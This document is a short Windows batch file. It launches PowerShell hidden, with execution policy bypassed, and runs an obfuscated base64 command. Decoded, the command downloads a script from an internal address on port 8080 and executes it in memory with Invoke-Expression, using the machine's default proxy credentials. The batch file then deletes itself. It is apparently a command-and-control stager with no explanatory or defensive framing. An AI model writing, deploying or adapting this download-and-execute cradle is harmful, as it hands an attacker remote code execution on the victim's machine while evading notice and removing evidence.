@echo off
start /B powershell.exe -nop -ep bypass -w 1 -enc IAAuACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwBTAEUAdAAtAGkAdAAnACwAJwBlAG0AJwApACAAIAAoACIAdgBhACIAKwAiAFIAaQBBAGIAIgArACIATABlADoAdQB0ACIAKwAiAE0ARwBOAHcAIgApACAAKAAgACAAWwBUAHkAcABFAF0AKAAiAHsAMgB9AHsAMwB9AHsAMQB9AHsAMAB9AHsANAB9ACIALQBmACAAJwBJACcALAAnAFIARQBkAEUAbgB0ACcALAAnAE4AZQAnACwAJwB0AC4AYwAnACwAJwBBAGwAQwBhAEMASABlACcAKQAgACAAKQAgADsAIAAoACYAKAAiAHsAMAB9AHsAMQB9AHsAMgB9ACIALQBmACcATgBlACcALAAnAHcALQBPAGIAagBlACcALAAnAGMAdAAnACkAIAAoACIAewAwAH0AewAyAH0AewAxAH0AewAzAH0AIgAtAGYAIAAnAE4AZQB0AC4AVwBlAGIAJwAsACcAZQAnACwAJwBDAGwAaQAnACwAJwBuAHQAJwApACkALgAiAFAAYABSAE8AWAB5ACIALgAiAGMAcgBFAGAAZABlAG4AYABUAGkAYQBgAEwAUwAiAD0AIAAkAFUAVABNAGcATgB3ADoAOgAiAGQAZQBgAEYAQQBVAEwAdABOAGAAZQBUAHcATwBgAFIASwBjAHIAZQBEAEUAbgBgAFQAaQBBAEwAcwAiADsALgAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAHIAJwAsACcAaQB3ACcAKQAoACgAIgB7ADkAfQB7ADYAfQB7ADEAfQB7ADUAfQB7ADgAfQB7ADEAMQB9AHsAMAB9AHsANAB9AHsAMwB9AHsAMgB9AHsANwB9AHsAMQAwAH0AIgAtAGYAJwAwADgAMAAnACwAJwBwADoALwAvADEANwAyACcALAAnAG8AdwAnACwAJwB3AG4AbABvAGEAZAAvAHAAJwAsACcALwBkAG8AJwAsACcALgAxADcALgAnACwAJwB0ACcALAAnAGUAcgBzAGgAZQAnACwAJwAxADQAJwAsACcAaAB0ACcALAAnAGwAbAAvACcALAAnADIALgAyADQAOQA6ADgAJwApACkALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwB8AC4AKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAJwBpAGUAJwAsACcAeAAnACkA
timeout /t 1 > nul
del "%~f0"